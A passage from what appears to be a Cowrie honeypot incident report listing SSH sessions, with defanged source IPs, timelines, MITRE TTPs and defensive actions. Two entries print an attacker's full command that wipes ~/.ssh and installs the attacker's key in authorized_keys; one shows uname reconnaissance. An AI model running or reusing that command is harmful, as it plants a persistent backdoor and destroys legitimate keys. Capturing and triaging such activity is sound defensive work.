| `2026-08-24 09:08:02` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:08:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:08:02` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeaa346ee2a1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:08 |
| **Last Seen** | 2026-08-24 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:08:05` | `cowrie.session.connect` |
| `2026-08-24 09:08:05` | `cowrie.client.version` |
| `2026-08-24 09:08:05` | `cowrie.client.kex` |
| `2026-08-24 09:08:06` | `cowrie.login.success` |
| `2026-08-24 09:08:06` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:08:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:08:06` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ed010d4d0e

| Field | Detail |
|---|---|
| **Source IP** | `176.204.245[.]251` |
| **First Seen** | 2026-08-24 09:10 |
| **Last Seen** | 2026-08-24 09:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:10:08` | `cowrie.session.connect` |
| `2026-08-24 09:10:09` | `cowrie.client.version` |
| `2026-08-24 09:10:09` | `cowrie.client.kex` |
| `2026-08-24 09:10:11` | `cowrie.login.success` |
| `2026-08-24 09:10:11` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.204.245[.]251` to AbuseIPDB if not already reported
- [ ] Block `176.204.245[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c962403996f

| Field | Detail |
|---|---|
| **Source IP** | `200.170.213[.]9` |
| **First Seen** | 2026-08-24 09:15 |
| **Last Seen** | 2026-08-24 09:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:15:15` | `cowrie.session.connect` |
| `2026-08-24 09:15:15` | `cowrie.client.version` |
| `2026-08-24 09:15:15` | `cowrie.client.kex` |
| `2026-08-24 09:15:17` | `cowrie.login.success` |
| `2026-08-24 09:15:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.170.213[.]9` to AbuseIPDB if not already reported
- [ ] Block `200.170.213[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01b8af7af56

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-24 09:15 |
| **Last Seen** | 2026-08-24 09:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:15:24` | `cowrie.session.connect` |
| `2026-08-24 09:15:24` | `cowrie.client.version` |
| `2026-08-24 09:15:24` | `cowrie.client.kex` |
| `2026-08-24 09:15:27` | `cowrie.login.success` |
| `2026-08-24 09:15:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624ffd9312e1

| Field | Detail |
|---|---|
| **Source IP** | `122.160.187[.]31` |
| **First Seen** | 2026-08-24 09:15 |
| **Last Seen** | 2026-08-24 09:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:15:32` | `cowrie.session.connect` |
| `2026-08-24 09:15:33` | `cowrie.client.version` |
| `2026-08-24 09:15:33` | `cowrie.client.kex` |
| `2026-08-24 09:15:35` | `cowrie.login.success` |
| `2026-08-24 09:15:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.187[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.187[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff6179dd317

| Field | Detail |
|---|---|
| **Source IP** | `59.48.40[.]6` |
| **First Seen** | 2026-08-24 09:15 |
| **Last Seen** | 2026-08-24 09:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:15:45` | `cowrie.session.connect` |
| `2026-08-24 09:15:47` | `cowrie.client.version` |
| `2026-08-24 09:15:47` | `cowrie.client.kex` |
| `2026-08-24 09:15:48` | `cowrie.login.success` |
| `2026-08-24 09:15:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `59.48.40[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093423c02727

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:17 |
| **Last Seen** | 2026-08-24 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:17:50` | `cowrie.session.connect` |
| `2026-08-24 09:17:50` | `cowrie.client.version` |
| `2026-08-24 09:17:50` | `cowrie.client.kex` |
| `2026-08-24 09:17:51` | `cowrie.login.success` |
| `2026-08-24 09:17:52` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:17:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:17:52` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef022b0a6c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:17 |
| **Last Seen** | 2026-08-24 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:17:54` | `cowrie.session.connect` |
| `2026-08-24 09:17:54` | `cowrie.client.version` |
| `2026-08-24 09:17:54` | `cowrie.client.kex` |
| `2026-08-24 09:17:55` | `cowrie.login.success` |
| `2026-08-24 09:17:55` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:17:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:17:55` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bd3368354d

| Field | Detail |
|---|---|
| **Source IP** | `117.223.152[.]94` |
| **First Seen** | 2026-08-24 09:19 |
| **Last Seen** | 2026-08-24 09:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:19:33` | `cowrie.session.connect` |
| `2026-08-24 09:19:33` | `cowrie.client.version` |
| `2026-08-24 09:19:33` | `cowrie.client.kex` |
| `2026-08-24 09:19:34` | `cowrie.login.success` |
| `2026-08-24 09:19:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.223.152[.]94` to AbuseIPDB if not already reported
- [ ] Block `117.223.152[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b7e277218a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:27 |
| **Last Seen** | 2026-08-24 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:27:28` | `cowrie.session.connect` |
| `2026-08-24 09:27:28` | `cowrie.client.version` |
| `2026-08-24 09:27:29` | `cowrie.client.kex` |
| `2026-08-24 09:27:30` | `cowrie.login.success` |
| `2026-08-24 09:27:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:27:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:27:30` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f6b3da0292

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:27 |
| **Last Seen** | 2026-08-24 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:27:33` | `cowrie.session.connect` |
| `2026-08-24 09:27:33` | `cowrie.client.version` |
| `2026-08-24 09:27:33` | `cowrie.client.kex` |
| `2026-08-24 09:27:34` | `cowrie.login.success` |
| `2026-08-24 09:27:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:27:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:27:35` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88affd16d7b6

| Field | Detail |
|---|---|
| **Source IP** | `107.173.127[.]185` |
| **First Seen** | 2026-08-24 09:28 |
| **Last Seen** | 2026-08-24 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:28:58` | `cowrie.session.connect` |
| `2026-08-24 09:28:58` | `cowrie.client.version` |
| `2026-08-24 09:28:58` | `cowrie.client.kex` |
| `2026-08-24 09:28:58` | `cowrie.login.success` |
| `2026-08-24 09:28:59` | `cowrie.session.params` |
| `2026-08-24 09:28:59` | `cowrie.command.input` |
| `2026-08-24 09:28:59` | `cowrie.log.closed` |
| `2026-08-24 09:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.127[.]185` to AbuseIPDB if not already reported
- [ ] Block `107.173.127[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6367b334bb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:37 |
| **Last Seen** | 2026-08-24 09:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:37:25` | `cowrie.session.connect` |
| `2026-08-24 09:37:25` | `cowrie.client.version` |
| `2026-08-24 09:37:26` | `cowrie.client.kex` |
| `2026-08-24 09:37:27` | `cowrie.login.success` |
| `2026-08-24 09:37:27` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:37:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:37:28` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10e8508cf294

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 09:37 |
| **Last Seen** | 2026-08-24 09:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:37:29` | `cowrie.session.connect` |
| `2026-08-24 09:37:30` | `cowrie.client.version` |
| `2026-08-24 09:37:30` | `cowrie.client.kex` |
| `2026-08-24 09:37:31` | `cowrie.login.success` |
| `2026-08-24 09:37:31` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:37:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 09:37:31` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a7b5cdace1

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-08-24 09:37 |
| **Last Seen** | 2026-08-24 09:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:37:35` | `cowrie.session.connect` |
| `2026-08-24 09:37:35` | `cowrie.client.version` |
| `2026-08-24 09:37:35` | `cowrie.client.kex` |
| `2026-08-24 09:37:37` | `cowrie.login.success` |
| `2026-08-24 09:37:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa1b4e430c58

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 09:38 |
| **Last Seen** | 2026-08-24 09:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:38:07` | `cowrie.session.connect` |
| `2026-08-24 09:38:07` | `cowrie.client.version` |
| `2026-08-24 09:38:07` | `cowrie.client.kex` |
| `2026-08-24 09:38:08` | `cowrie.login.success` |
| `2026-08-24 09:38:08` | `cowrie.direct-tcpip.request` |
| `2026-08-24 09:38:08` | `cowrie.direct-tcpip.data` |
| `2026-08-24 09:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6107ec92a33c

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-24 09:39 |
| **Last Seen** | 2026-08-24 09:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:39:12` | `cowrie.session.connect` |
| `2026-08-24 09:39:12` | `cowrie.client.version` |
| `2026-08-24 09:39:12` | `cowrie.client.kex` |
| `2026-08-24 09:39:13` | `cowrie.login.success` |
| `2026-08-24 09:39:14` | `cowrie.session.params` |
| `2026-08-24 09:39:14` | `cowrie.command.input` |
| `2026-08-24 09:39:14` | `cowrie.command.failed` |
| `2026-08-24 09:39:14` | `cowrie.log.closed` |
| `2026-08-24 09:39:16` | `cowrie.session.params` |
| `2026-08-24 09:39:16` | `cowrie.command.input` |
| `2026-08-24 09:39:16` | `cowrie.session.file_download` |
| `2026-08-24 09:39:16` | `cowrie.log.closed` |
| `2026-08-24 09:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83d38fd3656

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-24 09:39 |
| **Last Seen** | 2026-08-24 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:39:16` | `cowrie.session.connect` |
| `2026-08-24 09:39:16` | `cowrie.client.version` |
| `2026-08-24 09:39:16` | `cowrie.client.kex` |
| `2026-08-24 09:39:17` | `cowrie.login.success` |
| `2026-08-24 09:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7323802931

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-24 09:39 |
| **Last Seen** | 2026-08-24 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:39:18` | `cowrie.session.connect` |
| `2026-08-24 09:39:18` | `cowrie.client.version` |
| `2026-08-24 09:39:18` | `cowrie.client.kex` |
| `2026-08-24 09:39:19` | `cowrie.login.success` |
| `2026-08-24 09:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fdc2a3d8e42

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-24 09:39 |
| **Last Seen** | 2026-08-24 09:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:39:41` | `cowrie.session.connect` |
| `2026-08-24 09:39:41` | `cowrie.client.version` |
| `2026-08-24 09:39:42` | `cowrie.client.kex` |
| `2026-08-24 09:39:43` | `cowrie.login.success` |
| `2026-08-24 09:39:45` | `cowrie.session.params` |
| `2026-08-24 09:39:45` | `cowrie.command.input` |
| `2026-08-24 09:39:45` | `cowrie.command.failed` |
| `2026-08-24 09:39:45` | `cowrie.log.closed` |
| `2026-08-24 09:39:46` | `cowrie.session.params` |
| `2026-08-24 09:39:46` | `cowrie.command.input` |
| `2026-08-24 09:39:47` | `cowrie.session.file_download` |
| `2026-08-24 09:39:47` | `cowrie.log.closed` |
| `2026-08-24 09:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db1db2752404

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-24 09:39 |
| **Last Seen** | 2026-08-24 09:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:39:47` | `cowrie.session.connect` |
| `2026-08-24 09:39:47` | `cowrie.client.version` |
| `2026-08-24 09:39:47` | `cowrie.client.kex` |
| `2026-08-24 09:39:48` | `cowrie.login.success` |
| `2026-08-24 09:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c9d52b676a

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-24 09:39 |
| **Last Seen** | 2026-08-24 09:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 09:39:49` | `cowrie.session.connect` |
| `2026-08-24 09:39:49` | `cowrie.client.version` |
| `2026-08-24 09:39:49` | `cowrie.client.kex` |
| `2026-08-24 09:39:52` | `cowrie.login.success` |
| `2026-08-24 09:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8300f4bd7fb

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-08-24 09:40 |
| **Last Seen** | 2026-08-24 09:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
